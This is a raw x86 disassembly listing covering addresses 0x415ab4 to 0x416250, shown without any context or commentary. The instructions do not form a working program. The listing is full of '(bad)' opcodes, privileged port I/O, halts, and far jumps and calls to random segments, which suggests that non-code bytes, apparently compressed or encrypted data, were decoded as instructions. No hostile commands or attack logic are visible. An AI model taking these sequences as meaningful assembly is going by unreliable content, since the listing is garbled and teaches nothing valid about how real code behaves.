  415ab4:	cmp    dh,BYTE PTR [edi+0x3a]
  415ab7:	add    al,0x82
  415ab9:	pushf  
  415aba:	sbb    al,0x13
  415abc:	fs fwait
  415abe:	les    eax,FWORD PTR [eax+0x31]
  415ac1:	stos   DWORD PTR es:[edi],eax
  415ac2:	pop    es
  415ac3:	into   
  415ac4:	xchg   ebp,eax
  415ac5:	loope  0x415ab1
  415ac7:	mov    BYTE PTR [esi+0x45b84e5d],dh
  415acd:	add    esp,DWORD PTR [ebp+0x24]
  415ad0:	jns    0x415aee
  415ad2:	add    esp,DWORD PTR [esi]
  415ad4:	mov    ch,0x4f
  415ad6:	pop    ebp
  415ad7:	in     eax,dx
  415ad8:	jno    0x415aad
  415ada:	mov    esp,0x68cc2a1b
  415adf:	jle    0x415a81
  415ae1:	cmp    DWORD PTR [eax+0x23],ebp
  415ae4:	(bad)  
  415ae5:	sahf   
  415ae6:	mov    esi,0xe3237338
  415aeb:	push   cs
  415aec:	push   eax
  415aed:	push   edi
  415aee:	int    0x2c
  415af0:	sbb    BYTE PTR [esi+0xea85238],0xed
  415af7:	dec    ecx
  415af8:	aam    0x8c
  415afa:	in     eax,0xf4
  415afc:	icebp  
  415afd:	outs   dx,BYTE PTR ds:[esi]
  415afe:	int3   
  415aff:	sar    ecx,1
  415b01:	in     eax,0x19
  415b03:	and    eax,0x5b903892
  415b08:	mov    esi,0x25ae1921
  415b0d:	les    esi,FWORD PTR [edi+0x104cc415]
  415b13:	in     eax,0x4
  415b15:	mov    BYTE PTR [esi-0x3],ch
  415b18:	lar    edi,WORD PTR [eax+0x5f]
  415b1c:	jae    0x415ace
  415b1e:	push   ebp
  415b1f:	not    DWORD PTR [edx-0x3f]
  415b22:	scas   al,BYTE PTR es:[edi]
  415b23:	mov    bl,0x88
  415b25:	and    BYTE PTR [esi],0x91
  415b28:	sbb    bl,0x7a
  415b2b:	hlt    
  415b2c:	dec    ebp
  415b2d:	sub    eax,0x8978a9c8
  415b32:	imul   eax,ebx,0x4a24d53f
  415b38:	test   ebp,ebp
  415b3a:	fwait
  415b3b:	and    DWORD PTR [ebx-0x13],0x9e7b90a4
  415b42:	dec    eax
  415b43:	sbb    bl,BYTE PTR [eax-0x1ffe43ff]
  415b49:	push   esi
  415b4a:	adc    ecx,edi
  415b4c:	popa   
  415b4d:	push   es
  415b4e:	or     edi,DWORD PTR [esi-0x15]
  415b51:	in     al,0xd3
  415b53:	ror    BYTE PTR cs:[ebx-0x55],cl
  415b57:	enter  0x43c4,0x57
  415b5b:	fmulp  st(3),st
  415b5d:	xchg   ecx,eax
  415b5e:	pop    esi
  415b5f:	push   ss
  415b60:	push   esp
  415b61:	(bad)  
  415b62:	mov    dl,0x31
  415b64:	jo     0x415b34
  415b66:	push   edi
  415b67:	dec    esi
  415b68:	repnz xor DWORD PTR [ebx+0x15],eax
  415b6c:	sahf   
  415b6d:	or     DWORD PTR [ecx+eax*4],0x26b8751f
  415b74:	xchg   ebp,eax
  415b75:	adc    ebp,DWORD PTR ds:0x91a94ebf
  415b7b:	adc    ebx,DWORD PTR [ebx+0x35f8271]
  415b81:	gs in  eax,0x59
  415b84:	and    esp,DWORD PTR [edi-0x6a]
  415b87:	daa    
  415b88:	sar    DWORD PTR [ecx+0x4683340f],0xc5
  415b8f:	out    dx,eax
  415b90:	pop    esp
  415b91:	mov    ecx,0x14b6aa9d
  415b96:	(bad)  
  415b97:	xor    al,0xc6
  415b99:	js     0x415bf2
  415b9b:	inc    edx
  415b9c:	das    
  415b9d:	xor    cl,BYTE PTR ds:0xbd80be77
  415ba3:	mov    BYTE PTR [ebx+0x6a],al
  415ba6:	xlat   BYTE PTR ds:[bx]
  415ba8:	jmp    0x1c7e:0xae29dd56
  415baf:	loop   0x415b5e
  415bb1:	add    bh,dl
  415bb3:	stc    
  415bb4:	test   DWORD PTR [esp+edx*8],ecx
  415bb7:	xchg   ebp,eax
  415bb8:	inc    edi
  415bb9:	pop    esp
  415bba:	and    eax,0x3ce1890
  415bbf:	inc    ebp
  415bc0:	jmp    DWORD PTR [esi-0x38]
  415bc4:	stos   BYTE PTR es:[edi],al
  415bc5:	fdiv   QWORD PTR [ebx+edx*8+0x4f]
  415bc9:	xchg   ebx,eax
  415bca:	shl    al,1
  415bcc:	mov    ebx,0x1c0f26ca
  415bd1:	rcl    DWORD PTR [edx+0x4e],0x72
  415bd5:	dec    esi
  415bd6:	aaa    
  415bd7:	gs out 0xa4,eax
  415bda:	shld   DWORD PTR [edi-0x3],esi,0x8
  415bdf:	sub    DWORD PTR [eax+0xa00e05],ebx
  415be5:	loop   0x415bc6
  415be7:	clc    
  415be8:	xor    ecx,DWORD PTR [eax+0x6e202015]
  415bee:	dec    ebx
  415bef:	(bad)  
  415bf0:	cmp    eax,0x8629c904
  415bf5:	push   ebp
  415bf6:	or     al,0x6
  415bf8:	out    0xb2,eax
  415bfa:	lods   al,BYTE PTR ds:[esi]
  415bfb:	mov    ebx,0x3cc4765e
  415c00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c01:	and    eax,0x926bf94c
  415c06:	mov    dh,0x82
  415c08:	inc    esp
  415c09:	lds    edx,FWORD PTR [edx]
  415c0b:	fist   DWORD PTR [ebp+0x52]
  415c0e:	pop    esp
  415c0f:	cmp    DWORD PTR [eax-0x2c],esi
  415c12:	xlat   BYTE PTR ds:[ebx]
  415c13:	mov    ah,0x6d
  415c15:	fwait
  415c16:	jecxz  0x415c7b
  415c18:	and    bh,al
  415c1a:	jmp    0xef6f03e2
  415c1f:	cmp    edx,eax
  415c21:	retf   
  415c22:	pop    es
  415c23:	mov    ecx,0x35c1d728
  415c28:	test   eax,0x4b7f417f
  415c2d:	jg     0x415c58
  415c2f:	xor    al,0xc
  415c31:	into   
  415c32:	stos   BYTE PTR es:[edi],al
  415c33:	fsubr  st,st(3)
  415c35:	mov    esp,0x2b871703
  415c3a:	mov    bh,0x9
  415c3c:	ss retf 0x1610
  415c40:	or     esp,DWORD PTR [ebp+0x50f06ab]
  415c46:	adc    al,0x3c
  415c48:	mov    dh,0x46
  415c4a:	in     eax,0x1f
  415c4c:	test   eax,0x987661d9
  415c51:	fwait
  415c52:	imul   esi,DWORD PTR ss:[edi-0x727c1e85],0x1e71f480
  415c5d:	ins    BYTE PTR es:[edi],dx
  415c5e:	xchg   edx,eax
  415c5f:	test   BYTE PTR [edi-0x68dedffa],dh
  415c65:	aad    0x86
  415c67:	std    
  415c68:	mov    cl,0xe2
  415c6a:	sbb    BYTE PTR [ecx+0xc],cl
  415c6d:	int3   
  415c6e:	push   cs
  415c6f:	inc    esp
  415c70:	push   eax
  415c71:	hlt    
  415c72:	push   es
  415c73:	sbb    eax,0xffc930e1
  415c78:	xchg   ebx,eax
  415c79:	fs mov eax,0x9ecac747
  415c7f:	sbb    BYTE PTR [eax],0x82
  415c82:	lods   al,BYTE PTR ds:[esi]
  415c83:	mov    eax,0xf889aa48
  415c88:	jmp    0x350f:0x8eac0bf6
  415c8f:	je     0x415ccb
  415c91:	loope  0x415cbf
  415c93:	mov    ebx,0x8e1c021a
  415c99:	sbb    eax,0xc1f73641
  415c9e:	dec    ecx
  415c9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ca0:	or     BYTE PTR [eax+0x7a],ah
  415ca3:	(bad)  
  415ca4:	rol    ebp,cl
  415ca6:	inc    ebp
  415ca7:	add    al,0x62
  415ca9:	out    dx,al
  415caa:	out    dx,al
  415cab:	mov    esp,0x7d3c3b75
  415cb0:	cli    
  415cb1:	mov    ah,cl
  415cb3:	jmp    0x415cb3
  415cb5:	clc    
  415cb6:	sub    DWORD PTR [ebx],edi
  415cb8:	xchg   esi,ebx
  415cba:	out    0xf9,al
  415cbc:	mov    ds:0xbcc1dad2,al
  415cc1:	cmp    eax,esi
  415cc3:	pop    eax
  415cc4:	gs dec edi
  415cc6:	cmp    al,BYTE PTR ss:[edx]
  415cc9:	jl     0x415c5c
  415ccb:	aad    0x1e
  415ccd:	lds    ecx,FWORD PTR [ebp-0x73]
  415cd0:	push   0x3bbf1dce
  415cd5:	outs   dx,DWORD PTR ds:[esi]
  415cd6:	lock pop esp
  415cd8:	push   ebx
  415cd9:	(bad)  
  415cda:	lahf   
  415cdb:	cmc    
  415cdc:	out    dx,eax
  415cdd:	sub    al,BYTE PTR [edi]
  415cdf:	loope  0x415c99
  415ce1:	inc    ecx
  415ce2:	ror    ecx,0x29
  415ce5:	scas   eax,DWORD PTR es:[edi]
  415ce6:	inc    esp
  415ce7:	addr16 ret 
  415ce9:	adc    eax,0x9211c14b
  415cee:	test   al,0x52
  415cf0:	call   0x5ca74ea8
  415cf5:	inc    esp
  415cf6:	in     al,0x6b
  415cf8:	jmp    0x415d56
  415cfa:	in     eax,0x2c
  415cfc:	(bad)
  415d00:	rcl    ah,1
  415d02:	xchg   esp,ebp
  415d04:	pop    edx
  415d05:	inc    edx
  415d06:	in     eax,0x1a
  415d08:	popa   
  415d09:	stos   BYTE PTR es:[edi],al
  415d0a:	popf   
  415d0b:	ret    0x50d8
  415d0e:	xor    al,0x55
  415d10:	xchg   ebp,eax
  415d11:	icebp  
  415d12:	rcr    BYTE PTR [esi+0xe],0x3a
  415d16:	cmp    BYTE PTR [eax],bl
  415d18:	cmp    cx,WORD PTR [ebx+0x6d559bbf]
  415d1f:	aam    0xf8
  415d21:	and    al,0xc8
  415d23:	push   ss
  415d24:	adc    esp,DWORD PTR [edx]
  415d26:	push   eax
  415d27:	mov    al,0xbc
  415d29:	into   
  415d2a:	stos   DWORD PTR es:[edi],eax
  415d2b:	add    eax,0x5d8e8b90
  415d30:	stos   DWORD PTR es:[edi],eax
  415d31:	out    0xeb,al
  415d33:	nop
  415d34:	hlt    
  415d35:	or     bl,BYTE PTR [edx+0x8]
  415d38:	pop    edi
  415d39:	dec    ebp
  415d3a:	mov    al,ds:0xf5d27e90
  415d3f:	jmp    DWORD PTR [eax-0x6d]
  415d42:	mov    dh,0xd0
  415d44:	mov    DWORD PTR [eax],ecx
  415d46:	xchg   edx,eax
  415d47:	sbb    al,0x1f
  415d49:	icebp  
  415d4a:	sti    
  415d4b:	int3   
  415d4c:	dec    eax
  415d4d:	mov    DWORD PTR [edi+0xc],ebx
  415d50:	mov    ?,esi
  415d52:	or     ecx,ebx
  415d54:	push   ss
  415d55:	ror    BYTE PTR [eax+0x74],0x88
  415d59:	mov    DWORD PTR [ecx-0x5],edi
  415d5c:	xchg   ebx,edi
  415d5e:	cli    
  415d5f:	or     BYTE PTR [eax-0x56b0f22],0xda
  415d66:	retf   0xa66d
  415d69:	jmp    0x415d4b
  415d6b:	inc    edx
  415d6c:	test   esp,edi
  415d6e:	lds    ebx,FWORD PTR [esi+0x496cb399]
  415d74:	shl    DWORD PTR [edx+0x7f],cl
  415d77:	dec    ebx
  415d78:	jmp    0xc068:0x4439ebb2
  415d7f:	dec    edx
  415d80:	pop    eax
  415d81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d82:	rcr    ah,1
  415d84:	in     eax,0x1d
  415d86:	or     eax,ecx
  415d88:	dec    esi
  415d89:	sbb    BYTE PTR [ebp-0x75],bh
  415d8c:	outs   dx,DWORD PTR ds:[esi]
  415d8d:	icebp  
  415d8e:	adc    ecx,DWORD PTR [ecx]
  415d90:	xor    eax,0xe6476ba6
  415d95:	pop    ecx
  415d96:	clc    
  415d97:	ror    BYTE PTR [edi],cl
  415d99:	and    al,dh
  415d9b:	push   eax
  415d9c:	jae    0x415d3b
  415d9e:	xor    eax,0xa4e0db91
  415da3:	nop
  415da4:	xchg   edi,eax
  415da5:	xor    DWORD PTR [esi+0x4d],esi
  415da8:	add    BYTE PTR [esi],bh
  415daa:	cdq    
  415dab:	jo     0x415d4c
  415dad:	inc    esi
  415dae:	inc    eax
  415daf:	retf   
  415db0:	(bad)  [ecx]
  415db2:	mov    esi,0x43d2fe51
  415db7:	and    eax,0xac99ee79
  415dbc:	push   ecx
  415dbd:	lods   eax,DWORD PTR ds:[esi]
  415dbe:	sbb    edx,DWORD PTR [eax]
  415dc0:	pop    esp
  415dc1:	sbb    ch,dl
  415dc3:	and    al,0x7e
  415dc5:	scas   al,BYTE PTR es:[edi]
  415dc6:	shl    BYTE PTR [eax],1
  415dc8:	ret    
  415dc9:	jecxz  0x415e19
  415dcb:	push   esp
  415dcc:	mov    ebx,0xaef1e05d
  415dd1:	mov    al,ds:0xe05a354a
  415dd6:	sti    
  415dd7:	push   ss
  415dd8:	pop    esp
  415dd9:	sar    DWORD PTR [ebp-0x71997551],cl
  415ddf:	mov    fs,WORD PTR [edx-0x1b]
  415de2:	jne    0x415e3e
  415de4:	fucom  st(3)
  415de6:	xchg   ecx,eax
  415de7:	int3   
  415de8:	imul   si
  415deb:	jl     0x415d7d
  415ded:	ret    
  415dee:	mov    ch,0x65
  415df0:	outs   dx,BYTE PTR ds:[esi]
  415df1:	repz imul eax,DWORD PTR [eax+0x4a],0x9
  415df6:	pop    edi
  415df7:	arpl   WORD PTR [eax],ax
  415df9:	inc    esi
  415dfa:	cli    
  415dfb:	push   cs
  415dfc:	les    esi,FWORD PTR [esi+esi*1-0x7151eed9]
  415e03:	dec    ebx
  415e04:	mov    ecx,0x23a01975
  415e09:	ret    0xbf23
  415e0c:	sti    
  415e0d:	adc    al,0xfb
  415e0f:	lock fisubr WORD PTR [edi+0x38]
  415e13:	ja     0x415e20
  415e15:	fnstcw WORD PTR [ebp-0x549b4667]
  415e1b:	out    dx,al
  415e1c:	xchg   ecx,ecx
  415e1e:	mov    bh,0xa5
  415e20:	ss xor dh,dl
  415e23:	mov    dl,0x70
  415e25:	and    eax,0x170f4420
  415e2a:	(bad)  
  415e2b:	cld    
  415e2c:	mov    ds:0xa54fde91,al
  415e31:	out    0x41,eax
  415e33:	dec    esp
  415e34:	daa    
  415e35:	call   0x21f04dec
  415e3a:	and    BYTE PTR [esi+0x4ee9fe49],dl
  415e40:	jge    0x415e70
  415e42:	dec    ebp
  415e43:	stc    
  415e44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e45:	mov    dl,BYTE PTR [eax+0x12]
  415e48:	sbb    DWORD PTR [ecx-0x1b],esi
  415e4b:	mov    esi,esp
  415e4d:	add    dh,0x22
  415e50:	jecxz  0x415e4a
  415e52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415e53:	push   edx
  415e54:	test   al,0x40
  415e56:	mov    ch,0xc1
  415e58:	into   
  415e59:	pop    ebx
  415e5a:	test   al,0x32
  415e5c:	sub    cl,BYTE PTR [edi+0x41]
  415e5f:	mov    eax,0x7949a847
  415e64:	push   cs
  415e65:	cwde   
  415e66:	xchg   esi,eax
  415e67:	xchg   ebp,eax
  415e68:	dec    eax
  415e69:	in     al,dx
  415e6a:	es cli 
  415e6c:	cmp    ebx,ebx
  415e6e:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e70:	popa   
  415e71:	add    al,0x7b
  415e73:	out    0xbc,eax
  415e75:	adc    esi,DWORD PTR [ebx-0x1a]
  415e78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e79:	lock ret 
  415e7b:	jno    0x415e08
  415e7d:	xchg   ebx,eax
  415e7e:	cdq    
  415e7f:	mov    BYTE PTR [edi],ch
  415e81:	push   ss
  415e82:	xor    al,0x89
  415e84:	jb     0x415eed
  415e86:	xor    al,0xc5
  415e88:	inc    ebx
  415e89:	push   edi
  415e8a:	jbe    0x415e8d
  415e8c:	stc    
  415e8d:	adc    BYTE PTR [ebx-0xa],0xc0
  415e91:	mov    eax,ds:0x96e7ed43
  415e96:	jne    0x415f0b
  415e98:	jl     0x415f00
  415e9a:	fnsave [eax-0x71]
  415e9d:	and    ebx,esp
  415e9f:	call   0x4a7e9174
  415ea4:	sar    ch,cl
  415ea6:	ds mov esi,0xa636bbfd
  415eac:	enter  0x3cbc,0x43
  415eb0:	ss jae 0x415ee4
  415eb3:	das    
  415eb4:	imul   esp,DWORD PTR [eax],0x7add2393
  415eba:	cmp    BYTE PTR [ebx-0x57],0x30
  415ebe:	sub    BYTE PTR [ebx-0x3eb7661],0x6b
  415ec5:	(bad)  
  415ec6:	fwait
  415ec7:	sahf   
  415ec8:	pusha  
  415ec9:	(bad)  
  415eca:	xchg   ebx,eax
  415ecb:	and    DWORD PTR [ecx+0x4f4f9315],ebx
  415ed1:	out    dx,eax
  415ed2:	pop    es
  415ed3:	shr    BYTE PTR [edi],1
  415ed5:	rcr    DWORD PTR [edx+0x149722f0],1
  415edb:	xchg   ecx,eax
  415edc:	ja     0x415e95
  415ede:	popf   
  415edf:	xchg   esi,eax
  415ee0:	imul   esi,edx,0xffffffe6
  415ee3:	push   0xffffffee
  415ee5:	pop    edx
  415ee6:	jnp    0x415efd
  415ee8:	mov    dl,BYTE PTR [edx+0x76]
  415eeb:	sub    BYTE PTR [ecx],dh
  415eed:	push   ecx
  415eee:	call   0xe477:0x98239a76
  415ef5:	(bad)  
  415ef6:	dec    eax
  415ef7:	cmp    BYTE PTR [ebp+0x5a65bd50],al
  415efd:	neg    DWORD PTR [esi+0x244998fd]
  415f03:	iret   
  415f04:	ret    
  415f05:	lea    esi,[eax]
  415f07:	das    
  415f08:	jns    0x415eb6
  415f0a:	out    dx,al
  415f0b:	(bad)  
  415f0c:	outs   dx,DWORD PTR ds:[esi]
  415f0d:	stc    
  415f0e:	xchg   ebx,eax
  415f0f:	fdivr  QWORD PTR [ebx-0x5e]
  415f12:	std    
  415f13:	mov    ds,esp
  415f15:	cmp    ebx,DWORD PTR [ebx]
  415f17:	push   eax
  415f18:	pop    DWORD PTR [edi+0x63f1ff2c]
  415f1e:	ja     0x415f2a
  415f20:	xor    eax,0x9703665b
  415f25:	lods   al,BYTE PTR ds:[esi]
  415f26:	stos   DWORD PTR es:[edi],eax
  415f27:	(bad)  
  415f28:	and    BYTE PTR [eax+0x37],cl
  415f2b:	daa    
  415f2c:	adc    edx,DWORD PTR [edx+ecx*4]
  415f2f:	xchg   edi,eax
  415f30:	inc    esp
  415f31:	mov    edi,ds
  415f33:	mov    ebx,0xce9cb22d
  415f38:	dec    edi
  415f39:	dec    esi
  415f3a:	test   al,0x48
  415f3c:	fisub  WORD PTR [ebx-0x2fea5b26]
  415f42:	(bad)  
  415f43:	pop    ebx
  415f44:	xor    BYTE PTR [esi+esi*8-0x1a20fdc2],ch
  415f4b:	mov    eax,ds:0x89d069bd
  415f50:	sub    DWORD PTR [edi-0x6001f12e],0x4d
  415f57:	(bad)  
  415f58:	sar    DWORD PTR [ebx],1
  415f5a:	pushf  
  415f5b:	sbb    al,0x61
  415f5d:	jmp    0x9c96:0xae8932cf
  415f64:	fstp   QWORD PTR [edx+0x0]
  415f67:	pop    esp
  415f68:	fwait
  415f69:	and    DWORD PTR [edx],esi
  415f6b:	mov    ecx,0x4767156f
  415f70:	push   ebx
  415f71:	ret    0xfd65
  415f74:	adc    BYTE PTR es:[ebx-0x37e2f7a2],bl
  415f7b:	pop    edx
  415f7c:	scas   al,BYTE PTR es:[edi]
  415f7d:	dec    edx
  415f7e:	mov    ds:0xc632b6b5,eax
  415f83:	cmp    cl,ah
  415f85:	aam    0x43
  415f87:	div    BYTE PTR [ecx+0x22ccbe80]
  415f8d:	push   es
  415f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f8f:	xchg   edx,eax
  415f90:	js     0x415f42
  415f92:	pop    edi
  415f93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f94:	fwait
  415f95:	nop
  415f96:	mov    WORD PTR [ebp-0x1a],es
  415f99:	lock pop ebx
  415f9b:	or     DWORD PTR [edx-0x6a],ebp
  415f9e:	mov    ebx,0x9ace86a1
  415fa3:	adc    eax,0xfff79b8f
  415fa8:	outs   dx,DWORD PTR ds:[esi]
  415fa9:	adc    DWORD PTR [ecx-0x32],0xffffffef
  415fad:	dec    ebx
  415fae:	lds    eax,FWORD PTR [eax]
  415fb0:	test   BYTE PTR [ebx-0x80],dl
  415fb3:	icebp  
  415fb4:	test   DWORD PTR [edx+0x2ee4bafa],0xf8274ac5
  415fbe:	xor    BYTE PTR [ebp-0x734a7723],cl
  415fc4:	daa    
  415fc5:	or     dl,0xe9
  415fc8:	xchg   cl,al
  415fca:	ret    
  415fcb:	stos   BYTE PTR es:[edi],al
  415fcc:	je     0x41600a
  415fce:	and    eax,0x371ba92d
  415fd3:	mov    dl,0x14
  415fd5:	retf   
  415fd6:	jnp    0x415fd4
  415fd8:	aas    
  415fd9:	xchg   edi,eax
  415fda:	nop
  415fdb:	xor    bl,BYTE PTR [esi]
  415fdd:	add    al,0x2b
  415fdf:	jg     0x415f90
  415fe1:	mov    DWORD PTR [ebp-0x6f],0x101a579e
  415fe8:	xor    edi,DWORD PTR [eax]
  415fea:	sub    edx,edx
  415fec:	sub    DWORD PTR [ebx-0x2b88c00b],ecx
  415ff2:	mov    eax,0x7fd9039e
  415ff7:	mov    ah,0x9a
  415ff9:	test   eax,0xfd1a8c7
  415ffe:	jne    0x415f95
  416000:	sti    
  416001:	iret   
  416002:	pop    ss
  416003:	(bad)  
  416004:	xchg   ebx,eax
  416005:	les    esp,FWORD PTR [ecx-0x2d13956b]
  41600b:	sub    edx,ebp
  41600d:	mov    ecx,0x314fdd6
  416012:	fwait
  416013:	sbb    bh,BYTE PTR [eax]
  416015:	pushf  
  416016:	(bad)  
  416017:	sti    
  416018:	dec    ebx
  416019:	sbb    al,0xd2
  41601b:	out    dx,eax
  41601c:	xor    ebx,DWORD PTR [ebp+0x33a3cc69]
  416022:	cmp    bh,dh
  416024:	jo     0x416061
  416026:	and    esp,esp
  416028:	scas   eax,DWORD PTR es:[edi]
  416029:	inc    esp
  41602a:	(bad)  
  41602b:	lods   al,BYTE PTR ds:[esi]
  41602c:	loopne 0x41607a
  41602e:	mov    ecx,0x80728569
  416033:	mov    al,0x65
  416035:	jae    0x41608b
  416037:	retf   
  416038:	xchg   edi,eax
  416039:	xor    al,0xcd
  41603b:	int    0xeb
  41603d:	retf   
  41603e:	repz jno 0x4160b3
  416041:	test   BYTE PTR [ebx-0x6a],ah
  416044:	pop    edx
  416045:	shr    BYTE PTR [ecx-0x70],0x1f
  416049:	dec    ecx
  41604a:	sbb    ah,ch
  41604c:	leave  
  41604d:	into   
  41604e:	cmp    bl,BYTE PTR [eax]
  416050:	mov    WORD PTR [eax+0x7b],es
  416053:	xor    eax,0xb8b80ae
  416058:	popa   
  416059:	mov    DWORD PTR [ebx+0x20cea55e],eax
  41605f:	test   al,0xac
  416061:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416062:	(bad)  
  416063:	out    0xa6,al
  416065:	stc    
  416066:	push   esi
  416067:	xor    ah,0x84
  41606a:	clc    
  41606b:	pop    es
  41606c:	fld    DWORD PTR [ebx+0x63440b3d]
  416072:	xor    BYTE PTR [ebx],al
  416074:	push   esi
  416075:	or     edi,DWORD PTR [edi-0x80ab95a]
  41607b:	jmp    0xe437:0x21962280
  416082:	mov    al,BYTE PTR ds:0xbaf00d5f
  416088:	lock adc DWORD PTR [ecx+eiz*2+0x6a18a5aa],0x52
  416091:	scas   eax,DWORD PTR es:[edi]
  416092:	jp     0x416094
  416094:	xchg   edx,eax
  416095:	xor    BYTE PTR ds:0x81666e3,0x77
  41609c:	xor    dl,BYTE PTR [edi-0x3425c2a1]
  4160a2:	bound  ebx,QWORD PTR [eax-0x26b852c2]
  4160a8:	sahf   
  4160a9:	lea    esi,[ebp-0x7f14d863]
  4160af:	xchg   esi,eax
  4160b0:	aam    0xbb
  4160b2:	pop    edx
  4160b3:	hlt    
  4160b4:	mov    DWORD PTR [eax+0x54],ebx
  4160b7:	push   cs
  4160b8:	mov    bh,0xcc
  4160ba:	es (bad) 
  4160bc:	mov    esi,0x8c183ac5
  4160c1:	iret   
  4160c2:	in     al,0xaa
  4160c4:	in     al,dx
  4160c5:	mov    dl,0x1e
  4160c7:	push   esi
  4160c8:	shr    BYTE PTR [ecx+eax*4],1
  4160cb:	cmp    BYTE PTR [ebx],cl
  4160cd:	xor    dh,BYTE PTR [eax+0x54]
  4160d0:	push   ebx
  4160d1:	retf   0x97
  4160d4:	in     eax,0x29
  4160d6:	mov    bh,0x28
  4160d8:	pop    ds
  4160d9:	nop
  4160da:	sub    ebx,ebx
  4160dc:	int3   
  4160dd:	pop    esp
  4160de:	or     DWORD PTR [ebp+0xb],esp
  4160e1:	loopne 0x416120
  4160e3:	stos   DWORD PTR es:[edi],eax
  4160e4:	icebp  
  4160e5:	aaa    
  4160e6:	call   0x8149:0x3ac8e6b2
  4160ed:	add    esp,DWORD PTR [ecx-0x68]
  4160f0:	add    al,0xe9
  4160f2:	mov    ebx,0xab04076f
  4160f7:	inc    edi
  4160f8:	dec    ebp
  4160f9:	push   es
  4160fa:	mov    ebp,DWORD PTR [edi+0xe992fdd]
  416100:	nop
  416101:	mov    cl,0xfa
  416103:	push   ss
  416104:	mov    eax,0x6801d549
  416109:	mov    dl,0x98
  41610b:	and    eax,0x4e20f452
  416110:	sub    esi,DWORD PTR [edi]
  416112:	vcmpps xmm1,xmm6,XMMWORD PTR ds:0x2dc88c1f,0x74
  41611b:	inc    edx
  41611c:	in     eax,dx
  41611d:	mov    ch,0xed
  41611f:	stos   DWORD PTR es:[edi],eax
  416120:	popa   
  416121:	dec    esi
  416122:	popa   
  416123:	push   eax
  416124:	cdq    
  416125:	lahf   
  416126:	outs   dx,DWORD PTR ds:[esi]
  416127:	xchg   ecx,eax
  416128:	idiv   BYTE PTR [ebx+ebp*4]
  41612b:	cmp    ebx,eax
  41612d:	pop    ebx
  41612e:	add    DWORD PTR [ecx+0x4e3fe9fc],edi
  416134:	mov    bh,0xdf
  416136:	push   es
  416137:	push   ecx
  416139:	pusha  
  41613a:	pop    edx
  41613b:	adc    al,0x7e
  41613d:	outs   dx,DWORD PTR ds:[esi]
  41613e:	cmp    eax,0x1833e83b
  416143:	outs   dx,DWORD PTR ds:[esi]
  416144:	into   
  416145:	scas   eax,DWORD PTR es:[edi]
  416146:	mov    bh,0x33
  416148:	push   ds
  416149:	jg     0x416110
  41614b:	inc    BYTE PTR [ebx-0x30]
  41614e:	or     ch,BYTE PTR [edi-0x74]
  416151:	push   ecx
  416152:	push   esi
  416153:	inc    esi
  416154:	mov    esp,0xcfe938f5
  416159:	aas    
  41615a:	pusha  
  41615b:	call   0x1c5a2b0c
  416160:	in     al,0xe0
  416162:	dec    edx
  416163:	jle    0x4161a1
  416165:	pushf  
  416166:	gs test eax,0xaa7c596a
  41616c:	lea    edi,[ebx+0x57]
  41616f:	jmp    0xe71cc08
  416174:	pop    ebp
  416175:	xor    BYTE PTR [edi-0x55cce574],0x89
  41617c:	cmp    DWORD PTR [ebx+0x11],eax
  41617f:	xchg   esi,eax
  416180:	pop    es
  416181:	dec    esp
  416182:	add    DWORD PTR [esi+0x18815ebc],0x68c4278
  41618c:	jle    0x41619c
  41618e:	cli    
  41618f:	push   0xb895c843
  416194:	sub    bl,bl
  416196:	mov    ebp,0x90d9bec5
  41619b:	adc    bh,BYTE PTR [ebx+eax*4+0x7e]
  41619f:	pop    es
  4161a0:	mov    ss,WORD PTR [ecx+0x17724055]
  4161a6:	retf   
  4161a7:	push   es
  4161a8:	pop    ebp
  4161a9:	mov    esp,0x9323c2c0
  4161ae:	pop    esi
  4161af:	pop    esi
  4161b0:	test   dl,cl
  4161b2:	test   DWORD PTR [esi+edi*8-0x553bf4d2],ecx
  4161b9:	jne    0x41617d
  4161bb:	or     BYTE PTR [esi-0x1148fb71],bl
  4161c1:	push   0x25d531b6
  4161c6:	cwde   
  4161c7:	or     DWORD PTR [ebx],edx
  4161c9:	dec    edx
  4161ca:	call   0xee55:0x3aebab70
  4161d1:	fcomp  QWORD PTR [ecx*1-0x2283027c]
  4161d8:	cld    
  4161d9:	in     al,dx
  4161da:	jmp    0x7aa9:0x98382b52
  4161e1:	or     eax,0x62594b91
  4161e6:	jmp    0x6bd8e013
  4161eb:	and    eax,0xa641d598
  4161f0:	adc    edi,DWORD PTR [ebp+0x3356e80]
  4161f6:	arpl   WORD PTR [eax],bx
  4161f8:	sub    DWORD PTR [ebx+0x63],0x4b
  4161fc:	push   ebp
  4161fd:	or     al,0x4b
  4161ff:	hlt    
  416200:	xchg   ebp,eax
  416201:	jle    0x416234
  416203:	hlt    
  416204:	push   edx
  416205:	loop   0x416223
  416207:	cmp    eax,esi
  416209:	nop
  41620a:	cli    
  41620b:	data16 fldpi 
  41620e:	stos   DWORD PTR es:[edi],eax
  41620f:	sbb    BYTE PTR [edx+0x806e3a7],dh
  416215:	push   esi
  416216:	and    BYTE PTR [ebx],al
  416218:	jecxz  0x416231
  41621a:	sub    al,0xbb
  41621c:	repz ja 0x4161ec
  41621f:	cmc    
  416220:	fwait
  416221:	iret   
  416222:	push   ds
  416223:	shl    BYTE PTR [edi-0x3a],cl
  416226:	mov    ?,WORD PTR [esi-0x77ef417b]
  41622c:	div    DWORD PTR [edx]
  41622e:	(bad)  
  41622f:	mov    ecx,0xac4d1615
  416234:	jg     0x416267
  416236:	mov    ah,0x97
  416238:	iret   
  416239:	xchg   DWORD PTR [ebp-0x657c954],edx
  41623f:	mov    edi,0x3b4e2a88
  416244:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416245:	(bad)  
  416246:	pop    ebx
  416247:	sub    edx,ebp
  416249:	cmp    bh,BYTE PTR [esi-0x7f]
  41624c:	inc    edx
  41624d:	xchg   esi,eax
  41624e:	aas    
  41624f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416250:	loop   0x416207
